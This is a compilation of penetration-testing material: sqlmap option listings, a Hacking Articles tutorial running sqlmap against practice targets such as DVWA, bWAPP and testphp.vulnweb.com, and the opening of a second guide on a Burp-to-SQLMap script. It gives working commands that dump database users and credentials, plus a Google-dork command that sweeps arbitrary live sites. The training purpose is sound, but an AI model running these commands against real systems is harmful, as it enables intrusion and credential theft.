proxy from a givenlist--tor Use Tor anonymity network--tor-port=TORPORT Set the Tor proxy port to be other than the default--tor-type=TORTYPE Set the Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))--check-tor Check to see if Tor is used properly--delay=DELAY Delay in seconds between each HTTP request--timeout=TIMEOUT Seconds to wait before timeout connection (default 30)--retries=RETRIES Number of retries upon timeout (default 3)--randomize=RPARAM Randomly change the value for a given parameter(s)--safe-url=SAFEURL URL address to visit frequently during testing--safe-post=SAFE-POSTPOST data to send to a safe URL--safe-req=SAFE-REQUEST Load safe HTTP request from a file--safe-freq=SAFE-FREQ The number of regular requests between visits to a safe URL--skip-urlencode Skip URL encoding of payload data--csrf-token=CSRF-TOKENParameter used to hold the anti-CSRF token--csrf-url=CSRF-URL URL to visit for extraction of anti-CSRF token--csrf-method=CSRF-METHODHTTP method to use during anti-CSRF token page visit--csrf-retries=CSRF-RETRIESNumber of retries to get the anti-CSRF token (default 0)--force-ssl Force usage of SSL/HTTPS--chunked Use HTTP chunked transfer encoded (POST) requests--hpp Use HTTP parameter pollution method--eval=EVALCODE Evaluate the provided Python code before the request (e.g."import hashlib;id2=hashlib.md5(id).hexdigest()")GeneralThese options provide the opportunity to set general operating parameters.-s SESSIONFILE Load session from a stored (.sqlite) file-t TRAFFICFILE Log all HTTP traffic into a text file--answers=ANSWERS Set predefined answers (e.g. "quit=N,follow=N")--base64=BASE64PARAMSParameter(s) containing Base64 encoded data--base64-safe Use URL and filename safe Base64 alphabet (RFC 4648)--batch Never ask for user input; use the default behavior--binary-fields=BINARY-FIELDSThe result fields in binary format (e.g., "digest")--check-internet Check the Internet connection before assessing the target--cleanup Clean up sqlmap-specific UDF and tables from the database--crawl=CRAWLDEPTH Crawl the website starting from the target URL--crawl-exclude=CRAWL-EXCLUDERegexp to exclude pages from crawling (e.g. "logout")--csv-del=CSVDEL The delimiter to use in CSV output (default ",")--charset=CHARSET Blind SQL injection charset (e.g. "0123456789abcdef")--dump-format=DUMP-FORMATThe format of the data dump (CSV (default), HTML or SQLITE)--encoding=ENCODINGCharacter encoding to use for data retrieval (e.g., GBK)--eta Display the estimated time of arrival for each output--flush-session Flush session files for the current target--forms Parse and test forms on the target URL--fresh-queries Ignore query results stored in the session file--gpage=GOOGLEPAGE Use Google dork results starting from the given page number--har=HARFILE Log all HTTP traffic into a HAR file--hex Use hex conversion during data retrieval--output-dir=OUTPUT-DIRThe custom output directory path--parse-errors Parse and display DBMS error messages from responses--preprocess=PREPROCESSUse the named script(s) for preprocessing (request)--postprocess=POSTPROCESS Use the named script(s) for postprocessing (response)--repair Redump entries having an unknown character marker (?)--save=SAVECONFIG Save options to a configuration INI file--scope=SCOPE Regexp for filtering targets--skip-heuristics Skip heuristic detection of SQLi/XSS vulnerabilities--skip-waf Skip heuristic detection of WAF/IPS protection--table-prefix=TABLE-PREFIXThe prefix to use for temporary tables (default: "sqlmap")--test-filter=TEST-FILTERSelect tests by payloads and titles (e.g. ROW)--test-skip=TEST-SKIPSkip tests by payloads and titles (e.g., BENCHMARK)--web-root=WEBROOT The Web server document root directory (e.g. "/var/www")DetectionThe following options are used during research in the detection phase.--level=LEVEL The level of tests to perform (1-5, default 1)--risk=RISK The risk of tests to perform (1-3, default 1)--string=STRING A string to match when query is evaluated to True--not-string=FALSE-STRINGA string to match when query is evaluated to False--regexp=REGEXP Regexp to match when query is evaluated to True--code=CODE HTTP code to match when query is evaluated to True--smart Perform thorough tests only if positive heuristic(s)Brute forceThese options implement checks during the launch of a brute force attack.--common-tables Check the existence of common tables--common-columns Check the existence of common columns--common-files Check the existence of common filesMiscellaneousThese options do not fit into any of the above categories.-z MNEMONICS Use short mnemonics (e.g. "flu,bat,ban,tec=EU")--alert=ALERT Run host OS command(s) when SQL injection is found--beep Beep on the question and/or when SQLi/XSS/FI is found--disable-coloring Disable console output coloring--list-tampers Display list of available tamper scripts--offline Work in offline mode (only use session data)--results-file=RESULTS-FILE Location of CSV results file in multiple targets mode--shell Prompt for an interactive sqlmap shell--tmp-dir=TMPDIR Local directory for storing temporary files--unstable Adjust options for unstable connectionsLevel option valuesThis option dictates the volume of tests to perform and the extent of the feedback that they willprovide. A higher value implements more extensive checks.1A limited number of tests/requests; GET AND POST parameters will be tested(default)2Test cookies3Test cookies plus User-Agent/Referer4As above plus null values in parameters and other bugs5An extensive list of tests with an input file for payloads and boundaries


 UsageUsage: python sqlmap.py [options]Options: -h, --help Show basic help message and exit -hh Show advanced help message and exit --version Show program's version number and exit -v VERBOSE Verbosity level: 0-6 (default 1) Target: At least one of these options has to be provided to define the target(s) -u URL, --url=URL Target URL (e.g. "http://www.site.com/vuln.php?id=1") -d DIRECT Connection string for direct database connection -l LOGFILE Parse target(s) from Burp or WebScarab proxy log file -m BULKFILE Scan multiple targets given in a textual file -r REQUESTFILE Load HTTP request from a file -g GOOGLEDORK Process Google dork results as target URLs -c CONFIGFILE Load options from a configuration INI file Request: These options can be used to specify how to connect to the target URL -A AGENT, --user.. HTTP User-Agent header value -H HEADER, --hea.. Extra header (e.g. "X-Forwarded-For: 127.0.0.1") --method=METHOD Force usage of given HTTP method (e.g. PUT) --data=DATA Data string to be sent through POST (e.g. "id=1") --param-del=PARA.. Character used for splitting parameter values (e.g. &) --cookie=COOKIE HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..") --cookie-del=COO.. Character used for splitting cookie values (e.g. ;) --live-cookies=L.. Live cookies file used for loading up-to-date values --load-cookies=L.. File containing cookies in Netscape/wget format --drop-set-cookie Ignore Set-Cookie header from response --mobile Imitate smartphone through HTTP User-Agent header --random-agent Use randomly selected HTTP User-Agent header value --host=HOST HTTP Host header value --referer=REFERER HTTP Referer header value --headers=HEADERS Extra headers (e.g. "Accept-Language: fr\nETag: 123") --auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI) --auth-cred=AUTH.. HTTP authentication credentials (name:password) --auth-file=AUTH.. HTTP authentication PEM cert/private key file --ignore-code=IG.. Ignore (problematic) HTTP error code (e.g. 401) --ignore-proxy Ignore system default proxy settings --ignore-redirects Ignore redirection attempts --ignore-timeouts Ignore connection timeouts --proxy=PROXY Use a proxy to connect to the target URL --proxy-cred=PRO.. Proxy authentication credentials (name:password) --proxy-file=PRO.. Load proxy list from a file --proxy-freq=PRO.. Requests between change of proxy from a given list --tor Use Tor anonymity network --tor-port=TORPORT Set Tor proxy port other than default --tor-type=TORTYPE Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default)) --check-tor Check to see if Tor is used properly --delay=DELAY Delay in seconds between each HTTP request --timeout=TIMEOUT Seconds to wait before timeout connection (default 30) --retries=RETRIES Retries when the connection timeouts (default 3)
  --randomize=RPARAM Randomly change value for given parameter(s) --safe-url=SAFEURL URL address to visit frequently during testing --safe-post=SAFE.. POST data to send to a safe URL --safe-req=SAFER.. Load safe HTTP request from a file --safe-freq=SAFE.. Regular requests between visits to a safe URL --skip-urlencode Skip URL encoding of payload data --csrf-token=CSR.. Parameter used to hold anti-CSRF token --csrf-url=CSRFURL URL address to visit for extraction of anti-CSRF token --csrf-method=CS.. HTTP method to use during anti-CSRF token page visit --csrf-retries=C.. Retries for anti-CSRF token retrieval (default 0) --force-ssl Force usage of SSL/HTTPS --chunked Use HTTP chunked transfer encoded (POST) requests --hpp Use HTTP parameter pollution method --eval=EVALCODE Evaluate provided Python code before the request (e.g. "import hashlib;id2=hashlib.md5(id).hexdigest()") Optimization: These options can be used to optimize the performance of sqlmap -o Turn on all optimization switches --predict-output Predict common queries output --keep-alive Use persistent HTTP(s) connections --null-connection Retrieve page length without actual HTTP response body --threads=THREADS Max number of concurrent HTTP(s) requests (default 1) Injection: These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts -p TESTPARAMETER Testable parameter(s) --skip=SKIP Skip testing for given parameter(s) --skip-static Skip testing parameters that not appear to be dynamic --param-exclude=.. Regexp to exclude parameters from testing (e.g. "ses") --param-filter=P.. Select testable parameter(s) by place (e.g. "POST") --dbms=DBMS Force back-end DBMS to provided value --dbms-cred=DBMS.. DBMS authentication credentials (user:password) --os=OS Force back-end DBMS operating system to provided value --invalid-bignum Use big numbers for invalidating values --invalid-logical Use logical operations for invalidating values --invalid-string Use random strings for invalidating values --no-cast Turn off payload casting mechanism --no-escape Turn off string escaping mechanism --prefix=PREFIX Injection payload prefix string --suffix=SUFFIX Injection payload suffix string --tamper=TAMPER Use given script(s) for tampering injection data Detection: These options can be used to customize the detection phase --level=LEVEL Level of tests to perform (1-5, default 1) --risk=RISK Risk of tests to perform (1-3, default 1) --string=STRING String to match when query is evaluated to True --not-string=NOT.. String to match when query is evaluated to False --regexp=REGEXP Regexp to match when query is evaluated to True --code=CODE HTTP code to match when query is evaluated to True --smart Perform thorough tests only if positive heuristic(s) --text-only Compare pages based only on the textual content --titles Compare pages based only on their titles
  Techniques: These options can be used to tweak testing of specific SQL injection techniques --technique=TECH.. SQL injection techniques to use (default "BEUSTQ") --time-sec=TIMESEC Seconds to delay the DBMS response (default 5) --union-cols=UCOLS Range of columns to test for UNION query SQL injection --union-char=UCHAR Character to use for bruteforcing number of columns --union-from=UFROM Table to use in FROM part of UNION query SQL injection --dns-domain=DNS.. Domain name used for DNS exfiltration attack --second-url=SEC.. Resulting page URL searched for second-order response --second-req=SEC.. Load second-order HTTP request from file Fingerprint: -f, --fingerprint Perform an extensive DBMS version fingerprint Enumeration: These options can be used to enumerate the back-end database management system information, structure and data contained in the tables -a, --all Retrieve everything -b, --banner Retrieve DBMS banner --current-user Retrieve DBMS current user --current-db Retrieve DBMS current database --hostname Retrieve DBMS server hostname --is-dba Detect if the DBMS current user is DBA --users Enumerate DBMS users --passwords Enumerate DBMS users password hashes --privileges Enumerate DBMS users privileges --roles Enumerate DBMS users roles --dbs Enumerate DBMS databases --tables Enumerate DBMS database tables --columns Enumerate DBMS database table columns --schema Enumerate DBMS schema --count Retrieve number of entries for table(s) --dump Dump DBMS database table entries --dump-all Dump all DBMS databases tables entries --search Search column(s), table(s) and/or database name(s) --comments Check for DBMS comments during enumeration --statements Retrieve SQL statements being run on DBMS -D DB DBMS database to enumerate -T TBL DBMS database table(s) to enumerate -C COL DBMS database table column(s) to enumerate -X EXCLUDE DBMS database identifier(s) to not enumerate -U USER DBMS user to enumerate --exclude-sysdbs Exclude DBMS system databases when enumerating tables --pivot-column=P.. Pivot column name --where=DUMPWHERE Use WHERE condition while table dumping --start=LIMITSTART First dump table entry to retrieve --stop=LIMITSTOP Last dump table entry to retrieve --first=FIRSTCHAR First query output word character to retrieve --last=LASTCHAR Last query output word character to retrieve --sql-query=SQLQ.. SQL statement to be executed --sql-shell Prompt for an interactive SQL shell --sql-file=SQLFILE Execute SQL statements from given file(s) Brute force: These options can be used to run brute force checks
  --common-tables Check existence of common tables --common-columns Check existence of common columns --common-files Check existence of common files User-defined function injection: These options can be used to create custom user-defined functions --udf-inject Inject custom user-defined functions --shared-lib=SHLIB Local path of the shared library File system access: These options can be used to access the back-end database management system underlying file system --file-read=FILE.. Read a file from the back-end DBMS file system --file-write=FIL.. Write a local file on the back-end DBMS file system --file-dest=FILE.. Back-end DBMS absolute filepath to write to Operating system access: These options can be used to access the back-end database management system underlying operating system --os-cmd=OSCMD Execute an operating system command --os-shell Prompt for an interactive operating system shell --os-pwn Prompt for an OOB shell, Meterpreter or VNC --os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC --os-bof Stored procedure buffer overflow exploitation --priv-esc Database process user privilege escalation --msf-path=MSFPATH Local path where Metasploit Framework is installed --tmp-path=TMPPATH Remote absolute path of temporary files directory Windows registry access: These options can be used to access the back-end database management system Windows registry --reg-read Read a Windows registry key value --reg-add Write a Windows registry key value data --reg-del Delete a Windows registry key value --reg-key=REGKEY Windows registry key --reg-value=REGVAL Windows registry key value --reg-data=REGDATA Windows registry key value data --reg-type=REGTYPE Windows registry key value type General: These options can be used to set some general working parameters -s SESSIONFILE Load session from a stored (.sqlite) file -t TRAFFICFILE Log all HTTP traffic into a textual file --answers=ANSWERS Set predefined answers (e.g. "quit=N,follow=N") --base64=BASE64P.. Parameter(s) containing Base64 encoded data --base64-safe Use URL and filename safe Base64 alphabet (RFC 4648) --batch Never ask for user input, use the default behavior --binary-fields=.. Result fields having binary values (e.g. "digest") --check-internet Check Internet connection before assessing the target --cleanup Clean up the DBMS from sqlmap specific UDF and tables --crawl=CRAWLDEPTH Crawl the website starting from the target URL --crawl-exclude=.. Regexp to exclude pages from crawling (e.g. "logout") --csv-del=CSVDEL Delimiting character used in CSV output (default ",")
  --charset=CHARSET Blind SQL injection charset (e.g. "0123456789abcdef") --dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE) --encoding=ENCOD.. Character encoding used for data retrieval (e.g. GBK) --eta Display for each output the estimated time of arrival --flush-session Flush session files for current target --forms Parse and test forms on target URL --fresh-queries Ignore query results stored in session file --gpage=GOOGLEPAGE Use Google dork results from specified page number --har=HARFILE Log all HTTP traffic into a HAR file --hex Use hex conversion during data retrieval --output-dir=OUT.. Custom output directory path --parse-errors Parse and display DBMS error messages from responses --preprocess=PRE.. Use given script(s) for preprocessing (request) --postprocess=PO.. Use given script(s) for postprocessing (response) --repair Redump entries having unknown character marker (?) --save=SAVECONFIG Save options to a configuration INI file --scope=SCOPE Regexp for filtering targets --skip-heuristics Skip heuristic detection of SQLi/XSS vulnerabilities --skip-waf Skip heuristic detection of WAF/IPS protection --table-prefix=T.. Prefix used for temporary tables (default: "sqlmap") --test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW) --test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK) --web-root=WEBROOT Web server document root directory (e.g. "/var/www") Miscellaneous: These options do not fit into any other category -z MNEMONICS Use short mnemonics (e.g. "flu,bat,ban,tec=EU") --alert=ALERT Run host OS command(s) when SQL injection is found --beep Beep on question and/or when SQLi/XSS/FI is found --dependencies Check for missing (optional) sqlmap dependencies --disable-coloring Disable console output coloring --list-tampers Display list of available tamper scripts --offline Work in offline mode (only use session data) --purge Safely remove all content from sqlmap data directory --results-file=R.. Location of CSV results file in multiple targets mode --shell Prompt for an interactive sqlmap shell --tmp-dir=TMPDIR Local directory for storing temporary files --unstable Adjust options for unstable connections --update Update sqlmap --wizard Simple wizard interface for beginner users

  Page | 2www.hackingarticles.inTABLE OF CONTENTS 1Abstract32sqlmap52.1Features 53 The Sqlmap’sExploitation7 3.1Target URL83.2Targeting Log File 93.3Target Bulkfile 113.4Target Google Dorks 133.5Target HTTP requests 144 Database Penetration Testing using Sqlmap17 4.1Databases 184.2Tables 194.3Columns 204.4Get data from a table 214.5Dump All 225Exploiting Form Based Sql Injection using Sqlmap246SQL Injection Exploitation in Multiple Targets usingSqlmap317About Us37

  Page | 3www.hackingarticles.inAbstract Hello everyone. This publicationwill focus on a category of sqlmap commands called the “targetcommands.” Many might not have tried these commands but they can be proved very useful in thecorporate world.In this article, we’ll be shifting our focusback on one of the finest tools for SQL penetration testingavailable called SQLMAP.

  Page | 4www.hackingarticles.in


  Page | 5www.hackingarticles.insqlmap sqlmap is an open source penetration testing tool that automates the process of detecting andexploiting SQL injection flaws and taking over of database servers. It comes with a powerful detectionengine, many niche features for the ultimate penetration tester and a broad range of switches lastingfrom database fingerprinting, over data fetching from the database, to accessing the underlying filesystem and executing commands on the operating system via out-of-band connections.Features• Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2,SQLite, Firebird, Sybase, SAP MaxDB, HSQLDB and Informix database management systems.• Full support for six SQL injection techniques: boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries and out-of-band.• Support to directly connect to the database without passing via a SQL injection, by providingDBMS credentials, IP address, port, and database name.• Support to enumerate users, password hashes, privileges, roles, databases, tables, andcolumns.• Automatic recognition of password hash formats and support for cracking them using adictionary-based attack.• Support to dump database tables entirely, a range of entries or specific columns as per user’schoice. The user can also choose to dump only a range of characters from each column’s entry. • Support to search for specific database names, specific tables across all databases or specificcolumns across all databases’ tables. This is useful, for instance, to identify tables containingcustom application credentials where relevant columns’ names contain a string like a nameand pass.• Support to download and upload any file from the database server underlying file systemwhen the database software is MySQL, PostgreSQL or Microsoft SQL Server.• Support to execute arbitrary commands and retrieve their standard output on the databaseserver underlying operating system when the database software is MySQL, PostgreSQL orMicrosoft SQL Server.• Support to establish an out-of-band stateful TCP connection between the attacker machineand the database server underlying operating system. This channel can be an interactivecommand prompt, a Meterpreter session or a graphical user interface (VNC) session as peruser’s choice. • Support for database process’ user privilege escalation via Metasploit’sMeterpretergetsystem command.

  Page | 6www.hackingarticles.in


  Page | 7www.hackingarticles.inThe Sqlmap’s Exploitation Since it is a crime to attack a live website, we are restricting our focus on the websites that are madefor this testing purpose only. We have also used a local PC with SQL dhakkan installed in it. You canrefer to the articlespublished earlier to get an idea on how to configure dhakkan in your machine too. So, without further ado, let’s dive in. First and foremost, I configured SQL dhakkan in a machine with IP address 192.168.1.132. I go to thelesson 1 tab forerror based SQLi.http://192.168.1.132/sqlihttp://192.168.1.132/sqli

  Page | 8www.hackingarticles.inTarget URLOne of the most basic commands ever. Every database has a webpage and every webpage has a URL.We will attack these URLs to get our hands on the database inside! By adding‘-u <URL>’ in sqlmap command we can specify the URL we are targeting to check for SQLinjection. It is the most basic and necessary operation. Here, let’s fetch all the databases that IP address 192.168.1.132 might have by suffixing –dbsNow, all the databases available in the given IP have been dumped!sqlmap -u http://192.168.1.132/sqli/Less-1/?id=1 --dbs

  Page | 9www.hackingarticles.inTargeting Log FileMany tools save a log file to keep a record on the IP addresses communicating back and forth. We canfeed one such log file to the sqlmap and it will automatically test all the URLs in that log file. The log file can have a record of various targets in reality but here we’ll be capturing the request of awebsite in burp suite and then saving its log file for simplicity. Let’s turn on the intercept then. Go to the website “leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1” and capture therequest in a burp. It has an SQL injection lab installed over public IP for penetration testers.

  Page | 10www.hackingarticles.inThe captured request will be something like:Nowright click->save item and save this request as“logfile” on the desktop. No need to provideany extensions here.

  Page | 11www.hackingarticles.inOpen the terminal and type in the following command to automate the attack from the log file itself.Target BulkfileBulkfile is a text file that has the URLs of all the target machines each in a single line with the exactURL of where the attack is applicable. So, let’s create a bulkfile on the desktop called bulkfile.txt.This will open up a command line text editor called ‘nano’. Let’s feed in some URLs. To save the file:CTRL+O -> ENTER To exit nano:CTRL+X We are all set to attack both of these URLs together by the command:sqlmap -l /root/Desktop/logfiletouch bulkfile.txtsudo nano bulkfile.txt

  Page | 12www.hackingarticles.inWe’ll get the list of databases and we can continue with our other URL. sqlmap -m /root/Desktop/bulkfile.txt --dbs

  Page | 13www.hackingarticles.inTarget Google DorksWe can also automate the process of finding SQLi by adding in a Google dork target. What it does isthat it will start searching for all the websites with given Google dork and automatically keep applyingsqlmap on the websites that match the dork. Disclaimer: this attack will automatically be applied toany website that matches the dork, be it government or military, which is a serious criminal offenseso it is advised that you play with it carefully. As we know that error based SQL injections are often found in URLs having ‘.php?id=<num>’ in them,we can apply theinurlGoogle dork to find all the websites with this in its URL.As you can see sqlmap has found a website with ‘?id=1’ in its URL. I’ll be pressing n and canceling the sqlmap scan since it is a crime to do so. We can also specify the specific page number on which we want to apply the Google dork at by theoption “–gpage” sqlmap–g "inurl: ?id=1"

  Page | 14www.hackingarticles.inTarget HTTP requestsAn HTTP client sends an HTTP request to a server in the form of a request message which includes thefollowing format: A Request-line Zero or more header (General|Request|Entity) fields followed by CRLF An empty line (i.e., a line with nothing preceding the CRLF) indicating the end of the header fields Optionally a message-body The Request-Line begins with a method token, followed by the Request-URI and the protocol version,and ending with CRLF. The elements are separated by space SP characters.Request-Line = Method SP Request-URI SP HTTP-Version CRLF Hence, we can intercept these HTTP requests, save it in a text file and automate the attack withsqlmap.I captured the request of the website “master.byethost18.com/Less-1/?id=1” in the burp and willsave it in a text file called “httprequest.txt” and run the command:sqlmap -r /root/Desktop/httprequest.txt

  Page | 15www.hackingarticles.inAs you can see that sqlmap has detected the target in the text file. We can further apply –dbs to fetchall the databases.

  Page | 16www.hackingarticles.in


  Page | 17www.hackingarticles.inDatabase Penetration Testing usingSqlmap Sometimes you visit such websites that let you select product item through their picture gallery if youobserver its URL you will notice that product item is called through its product-ID numbers. Let’s take an example So when attacker visits such kind of website he always checks for SQL vulnerability inside web serverfor lunching SQL attack.Let’s check how attacker verifies SQL vulnerability. The attacker will try to break the query in order to order to get the error message, if he successfullyreceived an error message then it confirms that web server is SQL injection affected.From the screenshot you can see we have received error message successfully now we have madeSQL attack on a web server so that we can fetch database information.http://testphp.vulnweb.com/artists.php?artist=1http://testphp.vulnweb.com/artists.php?artist=1'

  Page | 18www.hackingarticles.inDatabasesFor database penetration testing we always choose SQLMAP, this tool is very helpful for beginnerswho are unable to retrieve database information manually or unaware of SQL injection techniques. Open the terminal in your Kali Linux and type following command which start SQL injection attack onthe targeted website.-u:target URL –dbs:fetch database name –batch: This will leave sqlmap to go with default behavior whenever user’s input would be required Here from the given screenshot, you can see we have successfully retrieve database name “acuart ” sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"--dbs --batch

  Page | 19www.hackingarticles.inTablesAs we know a database is a set of record which consist of multiple tables inside it therefore now useanother command in order to fetch entire table names from inside the database system.-D:DBMS database to enumerate (fetched database name) –tables:enumerate DBMS database tableAs a result, given in screenshot, we have enumerated entire table name of the database system. Thereare 8 tables inside the database “acuart” as following: T1: artists T2: carts T3: categ T4: featured T5: guestbook  T6: pictures T7: products T8: userssqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"-D acuart --table --batch

  Page | 20www.hackingarticles.inColumnsNow further we will try to enumerate the column name of the desired table. Since we know there is ausers table inside the database acuart and we want to know all column names of users table,therefore, we will generate another command for column captions enumeration.-T:DBMS table to enumerate (fetched table name) –columns: enumerate DBMS database columnssqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"-D acuart -T users --columns --batch

  Page | 21www.hackingarticles.inGet data from a tableSlowly and gradually we have penetrated many details of the database but last and most importantstep is to retrieve information from inside the columns of a table. Hence, at last, we will generate acommand which will dump information of users table.–dump: dump all information of DBMS databaseHere from the given screenshot, you can see it has to dump entire information of table users, mainlyusers table contains login credential of other users. You can use these credential for login into theserver on behalf of other users.sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"-D acuart -T users --dump --batch

  Page | 22www.hackingarticles.inDump AllThe last command is the most powerful command in sqlmap which will save your time in databasepenetration testing; this command will perform all the above functions at once and dump entiredatabase information including table names, column and etc.This will give you all information at once which contains database name as well as table’s records. Try it yourself!!!sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch 

  Page | 23www.hackingarticles.in


  Page | 24www.hackingarticles.inExploiting Form Based Sql Injection usingSqlmap Enteruser and passwordasbee andbugrespectively. Set security levellow, from list box chooses your bug selectSQL-Injection (Login form/Hero) now andclick on thehack.A login form gets open where it is asked to submit the credential of a superhero which we don’t know.So I am going to give any random login and password like iron: man, in order to capture the requestthrough burp suite.

  Page | 25www.hackingarticles.inTo capture the request of bWAPP click onthe proxy tag then click toinception is on the button, comeback to bWAPP and now click tologin.Use intercepts highlighted data within sqlmap commands.Now open the terminal of your kali Linux and type following command for the enumeration ofdatabases name.sqlmap -u http://192.168.1.102:81/bWAPP/sqli_3.php --data="login=iron&amp;password=man&amp;form=submit" -- method POST --dbs --batch

  Page | 26www.hackingarticles.inFrom enumeration result, we get the information of the back-end database management system isMYSQL 5.5 and web serveroperating system iswindows withApache 2.4.7 andPHP 5.5.9 and fetchall names of the database. So if you notice the image given below we have caught all name ofdatabases. Choose any name for fetching more details.Now type the below command which will try to fetch entire data from inside database of bwappsqlmap -u http://192.168.1.102:81/bWAPP/sqli_3.php --data="login=iron&amp;password=man&amp;form=submit" -- method POST -D bwapp --dump all --batch

  Page | 27www.hackingarticles.inFirstI found a table “BLOG” which contains four columns but this table appears to be empty as allfields are left blank.Next, I found table “MOVIES” in database bwapp and you can see from the given screenshot it containsmovies detail. There are 10 entries in each of the following column.Luckily!!! I have got data which containsid, login, password and secretentries inside the “HEROES”table and maybe this dumped data can help me to bypass the login page of the above web page whichwe have open in the browser. I will use the login and password later to verify it.

  Page | 28www.hackingarticles.inHere I found only three entries for table “USERS” inside the bwapp which also contains credential forthe admin account.Another empty table “VISITORS” like “blog” table, itis also left blank. Sqlmap has dumped too much of data from inside the database of bwapp, as you have seen I have gotdata from a different table, now let’s verify this result. Browse bwapp in localhost again and onceagain open the login form page inside the bwapp.If you remembered sqlmap has dumped table of “HEROES” which contains login and password nowusing above fetched data(Thor: Asgard) from inside the table of “heroes” I will use these credentialfor login.

  Page | 29www.hackingarticles.inNowtype thor in the text field given forlogin and thentype Asgard asa password.Clickonlogin.Congrats!!! We got successful login and you can read the secret given for Thor which exactly same asinside the “heroes” table. Conclusion: Through this article, we had learned how to perform an attack on a login form of a website and retrieve its data from inside the database.

  Page | 30www.hackingarticles.in


  Page | 31www.hackingarticles.inSQL Injection Exploitation in MultipleTargets using Sqlmap Start dvwa and select SQL injection vulnerability heretype user ID andclickonsubmit,nowcopy theURL.Startkali Linux then create a text file assql.txt on the desktop which will contain URL for multipletarget and past copied URL in a text file. From the screenshot, you can perceive that I had pastedabove URL in this text file and save assql.txt

  Page | 32www.hackingarticles.inRepeat the same process with different web. Now open thevulnweb.com, hereclick onURL givenforAcuart.Nowclick onbrowse categories thenclick on theposter

  Page | 33www.hackingarticles.inNow let verify whether the ID is vulnerable to SQL injection or not. Use thisapostrophe (‘) at the endof URL as shown in the screenshot. You can see I have received an error message which means the IDis vulnerable to SQL injection.CopyitsURLPaste above-copied URL undersql.txt, and save it again. So here I have saved two URL in a text filewhich means two vulnerable ID of the different web is saved under sql.txt file.

  Page | 34www.hackingarticles.inOpen the terminal and type following command to scan multiple targets through sqlmap for SQLinjection.So here you can see I have got database names for multiple targets. Here I founddvwa underdatabase names.Later I have got another database nameacurat.Now try yourself for multiple ID.sqlmap– m /root/Desktop/sql.txt–dbs --batch

  Page | 35www.hackingarticles.inReference:• https://www.hackingarticles.in/comprehensive-guide-to-sqlmap-target-options15249-2/• https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/• https://www.hackingarticles.in/exploiting-form-based-sql-injection-using-sqlmap/• https://www.hackingarticles.in/sql-injection-exploitation-multiple-targets-using-sqlmap/

  Page | 36www.hackingarticles.in


  Page | 37www.hackingarticles.inAbout Us “Simple training makes Deep Learning”  “IGNITE” is a worldwide name in IT field. As we provide high-quality cybersecurity training andconsulting services that fulfil students, government and corporate requirements.We are working towards the vision to “Develop India as a Cyber Secured Country”. With an outreachto over eighty thousand students and over a thousand major colleges, Ignite Technologies stood outto be a trusted brand in the Education and the Information Security structure.We provide training and education in the field of Ethical Hacking & Information Security to thestudents of schools and colleges along with the corporate world. The training can be provided at theclient’s location or even at Ignite’s Training Center. We have trained over 10,000 + individuals across the globe, ranging from students to security expertsfrom different fields. Our trainers are acknowledged as Security Researcher by the Top Companies like- Facebook, Google, Microsoft, Adobe, Nokia, Paypal, Blackberry, AT&T and many more. Even thetrained students are placed into a number of top MNC's all around the globe. Over with this, we arehaving International experience of training more than 400+ individuals.The two brands, Ignite Technologies & Hacking Articles have been collaboratively working from past10+ Years with about more than 100+ security researchers, who themselves have been recognized byseveral research paper publishing organizations, The Big 4 companies, Bug Bounty research programsand many more.Along with all these things, all the major certification organizations recommend Ignite's training for itsresources and guidance.Ignite's research had been a part of number of global Institutes and colleges, and even a multitude ofresearch papers shares Ignite's researchers in their reference.



BULK SQL InjectionTest on Burp Requests
Author
: Milad Khoshdel
Email
: miladkhoshdel@gmail.com

 
2 |Page 
Contents
 
INTRODUCTION .......................................................................................................................... 3What is QL Injection Attack ....................................................................................................... 3What is SQLMap ......................................................................................................................... 3What is Burp Suite Scanner ....................................................................................................... 4Exporting Packets from Burp Suite ............................................................................................ 4Installing Burp-to-SQLMap Script .............................................................................................. 6Running Burp-To-SQLMap Script ............................................................................................... 7Refrences ................................................................................................................................... 8

 
3 |Page 
INTRODUCTION
As you know, SQL Injection is a security vulnerability with critical severity. If you are a hacker youknow it as well that it takes a lot of times to find a sql injection vulnerability on a target. It will beworse if you are a penetration tester. You must check this vulnerability on all of 
 
target URLs byintercepting packets using
Burp Suit or other tools and in big Portals it’s not easy.
I have good news for hackers and pen testers. I made it easier by my new python script. The onlything you should do, is exporting your packets as a burp suit state file. The rest of steps will done by
my script. I called me script “Burp
-TO-
SQLMap” and I will explain the test process from
 thebeginning.
What is SQL Injection Attack
A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from theclient to the application. A successful SQL injection exploit can read sensitive data from thedatabase, modify database data (Insert/Update/Delete), execute administration operations on thedatabase (such as shutdown the DBMS), recover the content of a given file present on the DBMS filesystem and in some cases issue commands to the operating system. SQL injection attacks are a typeof injection attack, in which SQL commands are injected into data-plane input in order to effect theexecution of predefined SQL commands.
What is SQLMap
Sqlmap is an open source software that is used to detect and exploit database vulnerabilities andprovides options for injecting malicious codes into them. It is a penetration testing tool thatautomates the process of detecting and exploiting SQL injection flaws providing its user interface inthe terminal. The software is run at the command line and is available to download for differentoperating systems: Linux distributions, Windows and Mac OS operating systems.In addition to mapping and detecting vulnerabilities, the software enables access to the database,editing and deleting data, and viewing data in tables such as users, passwords, backups, phonenumbers, e-mail addresses, credit cards and other confidential and sensitive information.Sqlmap has full support for multiple DBMSs, including MySQL, Oracle, PostgreSQL, Microsoft SQLServer, Microsoft Access, IBM DB2, SQLite, Firebird and SAP MaxDB And full support for all injectiontechniques: Boolean, Error, Stack, Time, Union.

 
4 |Page 
What is Burp Suite Scanner
